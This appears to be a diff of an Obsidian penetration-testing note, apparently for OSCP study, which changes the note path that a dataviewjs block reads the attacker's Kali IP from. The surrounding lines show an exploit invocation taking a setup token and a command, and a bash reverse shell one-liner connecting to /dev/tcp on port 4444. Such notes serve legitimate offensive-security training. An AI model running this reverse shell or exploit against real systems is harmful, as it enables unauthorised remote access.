@@ -42,7 +42,7 @@ python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
 
 Suitable reverse shell command 
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `bash -i >& /dev/tcp/${KaliIP}/4444 0>&1`;
 
